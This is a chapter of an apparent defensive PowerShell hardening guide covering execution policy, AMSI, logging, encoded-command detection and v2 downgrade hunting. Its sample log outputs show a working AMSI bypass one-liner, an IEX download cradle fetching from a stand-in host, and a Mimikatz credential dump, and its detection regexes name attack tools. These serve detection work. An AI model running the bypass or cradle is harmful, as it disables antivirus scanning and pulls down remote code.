# 15 — PowerShell Security and Hardening

> **Module required:** None (built-in cmdlets); some commands require **Group Policy** or **Local Admin** rights.  
> **Run as:** Local Administrator for policy changes; standard user for read-only checks.

---

## ⚡ Quick Reference

| Command | Purpose |
|---------|---------|
| `Get-ExecutionPolicy` | View the current script execution policy for all scopes |
| `Set-ExecutionPolicy` | Change the script execution policy |
| `Get-WinEvent` (Event 4104) | Read Script Block Logging entries |
| `Get-WinEvent` (Event 4103) | Read Module Logging entries |
| `$ExecutionContext.SessionState.LanguageMode` | Check the current PowerShell language mode |
| `Get-AuthenticodeSignature` | Verify the digital signature of a script or file |
| `Start-Transcript` / `Stop-Transcript` | Enable or disable session transcription logging |
| `Get-WinEvent` (Event 4688) | Detect encoded commands and PS v2 downgrade attacks |
| `Get-ItemProperty` (Registry) | Read or set Protected Event Logging and logging policies |
| `Select-String` | Search logs and scripts for attack tool patterns |

---

## 1. Execution Policy — `Get-ExecutionPolicy` / `Set-ExecutionPolicy`

### What it does
Controls which PowerShell scripts are allowed to run. It is **not** a security boundary — attackers can bypass it trivially — but it still belongs in a defence-in-depth strategy.

### Full Syntax
```powershell
Get-ExecutionPolicy [-List] [-Scope <ExecutionPolicyScope>]
Set-ExecutionPolicy [-ExecutionPolicy] <ExecutionPolicy> [-Scope <ExecutionPolicyScope>] [-Force]
```

### Parameters Explained
| Parameter | Type | Description |
|-----------|------|-------------|
| `-List` | Switch | Shows the policy for every scope (MachinePolicy, UserPolicy, Process, CurrentUser, LocalMachine) |
| `-Scope` | Enum | `MachinePolicy`, `UserPolicy`, `Process`, `CurrentUser`, or `LocalMachine` |
| `-ExecutionPolicy` | Enum | `Restricted`, `AllSigned`, `RemoteSigned`, `Unrestricted`, `Bypass`, `Undefined` |
| `-Force` | Switch | Suppresses the confirmation prompt |

### Real-World Example
**Scenario:** Verify the effective execution policy at every scope, then enforce `AllSigned` at the machine level.

```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine -Force
```

### Tips & Warnings
> ⚠️ **Execution policy is not a security control.** An attacker can bypass it with `powershell -ExecutionPolicy Bypass -File payload.ps1` or by piping script content to `Invoke-Expression`.

> 💡 **Best practice:** Set `AllSigned` at `LocalMachine` and sign all authorised scripts. Enforce via GPO. `MachinePolicy` and `UserPolicy` scopes are set by Group Policy and cannot be overridden locally.

---

## 2. AMSI Testing and Bypass Detection

### What it does
AMSI allows antivirus engines to inspect PowerShell script content at runtime. Attackers frequently attempt to bypass AMSI before executing malicious payloads. Detecting those bypass attempts in logs is a critical blue-team skill.

### Full Syntax
```powershell
# Test that AMSI is functional by triggering the EICAR-equivalent test string
"AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
```

### Parameters Explained
| Parameter | Type | Description |
|-----------|------|-------------|
| `-FilterHashtable` | Hashtable | Filters event log by LogName, Id, StartTime, etc. |
| `-match` (operator) | Regex | Searches the `Message` property for AMSI-related bypass strings |

### Real-World Example
**Scenario:** Your EDR flagged suspicious PowerShell on `WS-PC042`. Check whether the attacker tried to disable AMSI.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-PowerShell/Operational'
    Id        = 4104
    StartTime = (Get-Date).AddHours(-24)
} -ComputerName WS-PC042 |
    Where-Object { $_.Message -match 'amsiInitFailed|AmsiUtils|Disable|Bypass' } |
    Select-Object TimeCreated, @{n='ScriptBlock';e={$_.Message.Substring(0,200)}} |
    Format-Table -Wrap
```

### Sample Output
```
TimeCreated              ScriptBlock
-----------              -----------
3/29/2026 11:04:33 PM    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Tips & Warnings
> ⚠️ **A successful AMSI bypass silences your AV.** If you see `amsiInitFailed` set to `$true` in logs, assume the subsequent commands evaded scanning — treat the host as compromised.

> 💡 Monitor for the strings `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer`, and `amsiContext` in Event 4104 logs as high-fidelity indicators of attack.

---

## 3. Constrained Language Mode

### What it does
Constrained Language Mode (CLM) limits PowerShell to a safe subset — blocking .NET types, COM objects, and `Add-Type`. It is the primary enforcement mechanism used by AppLocker and WDAC.

### Full Syntax
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### Parameters Explained
| `LanguageMode` Value | Description |
|----------------------|-------------|
| `FullLanguage` | No restrictions — default when no policy is applied |
| `ConstrainedLanguage` | Blocks .NET, COM, and `Add-Type`; enforced by AppLocker/WDAC |
| `RestrictedLanguage` | Variables allowed but no script blocks or function calls |
| `NoLanguage` | Only cmdlets and functions permitted; no scripting at all |

### Real-World Example
**Scenario:** On the target endpoint, verify the language mode.

```powershell
$mode = $ExecutionContext.SessionState.LanguageMode
if ($mode -ne 'ConstrainedLanguage') {
    Write-Warning "NOT in Constrained Language Mode — verify WDAC/AppLocker policy."
} else { Write-Host "Current Language Mode: $mode" }
```

### Sample Output
```
Current Language Mode: ConstrainedLanguage
```

### Tips & Warnings
> ⚠️ **CLM can be bypassed** if an attacker finds a signed Microsoft binary that runs in Full Language Mode (e.g., via PowerShell v2). Always pair CLM with the removal of `powershell.exe` v2 — see section 8.

> 💡 **Test your AppLocker/WDAC rules** on a pilot group before org-wide deployment. A misconfigured policy in ConstrainedLanguage can break legitimate admin scripts. For testing, set `$__PSLockdownPolicy = 4` (not reliable for security — use AppLocker/WDAC in production).

---

## 4. Script Block Logging — Event 4104

### What it does
Script Block Logging records every PowerShell script block executed, including dynamically generated code and deobfuscated commands. Event ID **4104** in `Microsoft-Windows-PowerShell/Operational` is the most valuable log source for hunting PowerShell-based attacks.

### Full Syntax
```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 1 -Type DWord -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockInvocationLogging' -Value 1 -Type DWord -Force
Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104 }
```

### Parameters Explained
| Registry Value | Type | Description |
|----------------|------|-------------|
| `EnableScriptBlockLogging` | DWORD | `1` enables logging of all script blocks |
| `EnableScriptBlockInvocationLogging` | DWORD | `1` enables start/stop invocation logging (verbose) |

### Real-World Example
**Scenario:** Pull the last 24 hours of script block logs and search for known attack strings.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104
    StartTime = (Get-Date).AddHours(-24)
} -EA SilentlyContinue | Where-Object {
    $_.Message -match 'Invoke-Mimikatz|Invoke-Shellcode|Net\.WebClient|DownloadString|IEX'
} | Select-Object TimeCreated, @{n='ScriptExcerpt';e={
    $_.Message.Substring(0, [Math]::Min(300, $_.Message.Length))
}} | Format-Table -Wrap
```

### Sample Output
```
TimeCreated              ScriptExcerpt
-----------              -------------
3/29/2026 10:48:12 PM    IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')
```

### Tips & Warnings
> ⚠️ **Script Block Logging is the single most important PowerShell security control.** Enable it on every endpoint via GPO: `Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging`.

> 💡 PowerShell 5.0+ automatically logs suspicious blocks even without the GPO if `EnableScriptBlockLogging` is not explicitly disabled. Increase the `Microsoft-Windows-PowerShell/Operational` log size to at least 100 MB and forward logs to a SIEM.

---

## 5. Module Logging — Event 4103

### What it does
Module Logging records pipeline execution details — which cmdlets were called, with what parameters, and what output was produced. Event ID **4103** captures this data. Combined with Script Block Logging (4104), it provides complete PowerShell visibility.

### Full Syntax
```powershell
# Enable Module Logging for all modules via registry
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 1 -Type DWord -Force
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames' `
    -Name '*' -Value '*' -Type String -Force

# Query Module Logging events
Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4103 }
```

### Parameters Explained
| Registry Value | Type | Description |
|----------------|------|-------------|
| `EnableModuleLogging` | DWORD | `1` enables module logging |
| `ModuleNames\*` | String | `*` logs all modules; or specify individual module names |

### Real-World Example
**Scenario:** Find any use of `Invoke-WebRequest` or `Invoke-RestMethod` in the last 12 hours.

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-PowerShell/Operational'
    Id        = 4103
    StartTime = (Get-Date).AddHours(-12)
} | Where-Object { $_.Message -match 'Invoke-WebRequest|Invoke-RestMethod|Net\.WebClient' } |
    Select-Object TimeCreated, @{n='Detail';e={
        ($_.Message -split "`n" | Select-String 'CommandInvocation|ParameterBinding').Line
    }} | Format-List
```

### Sample Output
```
TimeCreated : 3/29/2026 3:22:14 PM
Detail      : CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
```

### Tips & Warnings
> 💡 **Module Logging captures parameter values** that Script Block Logging may not. Use both together for full coverage.

> ⚠️ Logging all modules (`*`) generates significant volume. In resource-constrained environments, log high-risk modules selectively: `Microsoft.PowerShell.Management`, `Microsoft.PowerShell.Utility`, `NetTCPIP`, `DnsClient`.

---

## 6. Transcription Logging

### What it does
Transcription creates a text file recording everything typed and printed in a PowerShell session. It captures commands, output, errors, and timestamps, supplementing event-log-based logging.

### Full Syntax
```powershell
# Enable via registry / GPO (use UNC path for centralised collection)
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 1 -Type DWord -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'OutputDirectory' -Value '\\fileserver\PSTranscripts$' -Type String -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableInvocationHeader' -Value 1 -Type DWord -Force

# Manual session transcript
Start-Transcript -Path "C:\PSTranscripts\session_$(Get-Date -f yyyyMMdd_HHmmss).txt"
Stop-Transcript
```

### Parameters Explained
| Registry Value | Type | Description |
|----------------|------|-------------|
| `EnableTranscripting` | DWORD | `1` enables automatic transcription for all sessions |
| `OutputDirectory` | String | UNC or local path where transcripts are saved |
| `EnableInvocationHeader` | DWORD | `1` adds timestamps before each command in the transcript |

### Sample Output
```
**********************
Windows PowerShell transcript start
Start time: 20260329154500
Username: CORP\jsmith   Machine: WS-PC042
**********************
PS C:\> whoami
corp\jsmith
**********************
Windows PowerShell transcript end
End time: 20260329154600
**********************
```

### Tips & Warnings
> ⚠️ **Transcripts may contain sensitive data** (passwords typed in `Read-Host`, tokens in output). Secure the output directory with strict ACLs and encrypt at rest.

> 💡 **Enable `EnableInvocationHeader`** — without it, you lose the per-command timestamps that are critical for incident timelines. Combine transcription with Script Block Logging for full coverage.

---

## 7. Detecting Base64-Encoded Commands in Logs

### What it does
Attackers encode PowerShell payloads in Base64 using `-EncodedCommand` (`-enc`) to evade string-matching detections. Hunting for these in process-creation logs (Event 4688) and PowerShell operational logs is a fundamental detection technique.

### Full Syntax
```powershell
# Search process-creation events for encoded command usage
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4688 } |
    Where-Object { $_.Message -match '-[Ee][Nn][Cc]\s|EncodedCommand|FromBase64String' }

# Decode a suspected Base64 payload
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA'))
```

### Parameters Explained
| Technique | Description |
|-----------|-------------|
| Event 4688 | Process Creation event — requires `Audit Process Creation` with command-line logging |
| `FromBase64String` | .NET method to decode Base64 — a red flag when seen in logs |

### Real-World Example
**Scenario:** Decode what a flagged `powershell.exe` process ran.

```powershell
$hits = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'; Id = 4688; StartTime = (Get-Date).AddHours(-4)
} | Where-Object { $_.Message -match '-[Ee]nc[Oo]?[Dd]?' }

[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(
    ($hits[0].Message -replace '.*-[Ee](?:nc|ncodedCommand)\s+([A-Za-z0-9+/=]+).*','$1')))
```

### Sample Output
```
TimeCreated              Decoded
-----------              -------
3/29/2026 9:13:22 PM     Invoke-Mimikatz -DumpCreds
```

### Tips & Warnings
> ⚠️ **Enable command-line logging in process-creation events.** Without it, Event 4688 only shows the executable name, not the arguments. Enable via GPO: `Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line in process creation events`.

> 💡 Script Block Logging (Event 4104) automatically decodes `-EncodedCommand` payloads and logs the plaintext — this makes 4104 your best detection source. Also watch for short aliases: `-ec`, `-en`, `-enc`.

---

## 8. PowerShell v2 Downgrade Attack Detection

### What it does
PowerShell v2 does not support AMSI, Script Block Logging, or CLM. Attackers invoke `powershell.exe -Version 2` to bypass all modern security controls. Detecting and preventing this downgrade is essential.

### Full Syntax
```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart
Get-WinEvent -FilterHashtable @{ LogName = 'Windows PowerShell'; Id = 400 } |
    Where-Object { $_.Message -match 'EngineVersion=2' }
```

### Parameters Explained
| Command | Description |
|---------|-------------|
| `Get-WindowsOptionalFeature` | Queries the install state of Windows optional features |
| `Disable-WindowsOptionalFeature` | Removes the PS v2 engine and its .NET 2.0 dependency |
| Event 400 (`Windows PowerShell` log) | Engine lifecycle event recording the PowerShell version at session start |

### Real-World Example
**Scenario:** Verify PS v2 is disabled and hunt for recent downgrade attempts.

```powershell
$feature = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
if ($feature.State -eq 'Enabled') {
    Write-Warning 'PS v2 is still enabled — removing now.'
    Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart
}
Get-WinEvent -FilterHashtable @{
    LogName = 'Windows PowerShell'; Id = 400; StartTime = (Get-Date).AddDays(-30)
} | Where-Object { $_.Message -match 'EngineVersion=2' } |
    Select-Object TimeCreated, @{n='Detail';e={($_.Message -split "`n" | Select-String 'EngineVersion|HostName').Line}} |
    Format-Table -Wrap
```

### Sample Output
```
WARNING: PS v2 is still enabled — removing now.

TimeCreated              Detail
-----------              ------
3/27/2026 2:14:00 AM     EngineVersion=2.0   HostName=ConsoleHost
```

### Tips & Warnings
> ⚠️ **Remove PS v2 on every system.** There is almost no legitimate reason to keep it. It is the most common PowerShell security bypass.

> 💡 Create a SIEM detection rule for Event 400 where `EngineVersion=2`. Any match is suspicious. Removing `MicrosoftWindowsPowerShellV2Root` also removes the .NET Framework 2.0 dependency.

---

## 9. `Get-AuthenticodeSignature`

### What it does
Verifies the digital signature on a PowerShell script, DLL, or executable. Lets you check signatures and detect tampering.

### Full Syntax
```powershell
Get-AuthenticodeSignature [-FilePath] <String[]>
Get-ChildItem *.ps1 | Get-AuthenticodeSignature
```

### Parameters Explained
| Parameter | Type | Description |
|-----------|------|-------------|
| `-FilePath` | String[] | Path(s) to the file(s) to check |
| `.Status` | Property | `Valid`, `NotSigned`, `HashMismatch` (tampered), `NotTrusted` |
| `.SignerCertificate` | Property | The X.509 certificate that signed the file |

### Real-World Example
**Scenario:** Check signatures and find unsigned or tampered scripts across a deployment share.

```powershell
Get-ChildItem -Path '\\fileserver\Scripts$' -Recurse -Filter *.ps1 |
    Get-AuthenticodeSignature |
    Where-Object { $_.Status -ne 'Valid' } |
    Select-Object Path, Status, @{n='Signer';e={$_.SignerCertificate.Subject}} |
    Format-Table -AutoSize
```

### Sample Output
```
Path                                     Status        Signer
----                                     ------        ------
\\fileserver\Scripts$\old-report.ps1     NotSigned
\\fileserver\Scripts$\deploy-v2.ps1      HashMismatch  CN=CORP Code Signing
```

### Tips & Warnings
> ⚠️ **`HashMismatch` means the file was modified after signing** — this could indicate tampering. Investigate immediately.

> 💡 Use `Set-AuthenticodeSignature` with a code-signing cert and **timestamp server** (`-TimestampServer 'http://timestamp.digicert.com'`). Without a timestamp, the signature becomes invalid when the certificate expires.

---

## 10. Protected Event Logging

### What it does
Protected Event Logging encrypts sensitive data in PowerShell event logs using a CMS certificate. Secrets captured by Script Block Logging are encrypted at rest and can only be decrypted by authorised analysts.

### Full Syntax
```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging' `
    -Name 'EnableProtectedEventLogging' -Value 1 -Type DWord -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging' `
    -Name 'EncryptionCertificate' -Value '<Base64-encoded certificate>' -Type String -Force
Unprotect-CmsMessage -Content $event.Message   # decrypt (requires private key)
```

### Parameters Explained
| Parameter | Type | Description |
|-----------|------|-------------|
| `EnableProtectedEventLogging` | DWORD | `1` enables encryption of sensitive log content |
| `EncryptionCertificate` | String | Base64-encoded public certificate (`.cer`) for encryption |
| `Unprotect-CmsMessage` | Cmdlet | Decrypts a CMS-encrypted string (requires the private key) |

### Real-World Example
**Scenario:** Enable Protected Event Logging so captured secrets are encrypted.

```powershell
$certBase64 = [Convert]::ToBase64String((Get-Content C:\Certs\PSLogDecryption.cer -Encoding Byte))
New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging' -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging' `
    -Name 'EnableProtectedEventLogging' -Value 1 -Type DWord -Force
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging' `
    -Name 'EncryptionCertificate' -Value $certBase64 -Type String -Force
$event = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 1
Unprotect-CmsMessage -Content $event.Message   # on SOC workstation with private key
```

### Tips & Warnings
> ⚠️ **Guard the private key.** Only install the private key on authorised SOC/DFIR analyst workstations. The endpoints only need the public certificate.

> 💡 Deploy the public certificate via GPO: `Computer Configuration → Administrative Templates → Windows Components → Event Logging → Enable Protected Event Logging`. Requires PowerShell 5.1+ and works with Event IDs 4103 and 4104.

---

## 11. Detecting Common PowerShell Attack Tool Patterns

### What it does
Many post-exploitation frameworks (PowerSploit, Empire, Cobalt Strike, Nishang) use recognisable string patterns. Searching Script Block Logs (Event 4104) for these patterns is one of the most effective threat-hunting techniques.

### Full Syntax
```powershell
$attackRegex = 'Invoke-Mimikatz|Invoke-Kerberoast|Invoke-DCSync|Get-GPPPassword|' +
               'Invoke-Shellcode|DownloadString\(|Net\.WebClient|SharpHound|Rubeus|PowerView'
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104
} | Where-Object { $_.Message -match $attackRegex }
```

### Real-World Example
**Scenario:** Sweep 48 hours of logs across compromised hosts for post-exploitation tools.

```powershell
@('DC01','WS-PC042','WS-PC105') | ForEach-Object {
    Get-WinEvent -FilterHashtable @{
        LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104
        StartTime = (Get-Date).AddHours(-48)
    } -ComputerName $_ -EA SilentlyContinue |
        Where-Object { $_.Message -match $attackRegex } |
        Select-Object @{n='Computer';e={$_}}, TimeCreated,
            @{n='Match';e={($_.Message | Select-String $attackRegex).Matches.Value}}
}
```

### Sample Output
```
Computer   Time                     Match
--------   ----                     -----
WS-PC042   3/29/2026 10:48:12 PM   Invoke-Mimikatz
WS-PC042   3/29/2026 10:47:55 PM   DownloadString(
```

### Tips & Warnings
> ⚠️ **String matching catches known tools but not novel ones.** Complement pattern-based hunting with behavioural detections (e.g., unusual parent-child process trees). Update your pattern list regularly from threat intel feeds.

> 💡 For large-scale hunting, forward Event 4104 to a SIEM and build scheduled queries. **Combine multiple signals:** a single `Net.WebClient` may be benign, but `Net.WebClient` + `FromBase64String` + `IEX` in the same script block is high confidence malicious.

---

## 🔍 Additional Hardening Checklist

```powershell
$sb  = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -EA SilentlyContinue
$mod = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -EA SilentlyContinue
$tx  = Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -EA SilentlyContinue

[PSCustomObject]@{
    ScriptBlockLogging = if ($sb.EnableScriptBlockLogging -eq 1) {'Enabled'} else {'DISABLED'}
    ModuleLogging      = if ($mod.EnableModuleLogging -eq 1) {'Enabled'} else {'DISABLED'}
    Transcription      = if ($tx.EnableTranscripting -eq 1) {'Enabled'} else {'DISABLED'}
    PSv2State          = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root).State
    ExecutionPolicy    = Get-ExecutionPolicy -Scope LocalMachine
    LanguageMode       = $ExecutionContext.SessionState.LanguageMode
}
```

---

## Navigation

| ← Previous | Home | Next → |
|-----------|------|--------|
| [14 — Windows Registry Security](14-Windows-Registry-Security.md) | [README](../README.md) | [16 — WinRM and Remote Management Security](16-WinRM-and-Remote-Management-Security.md) |
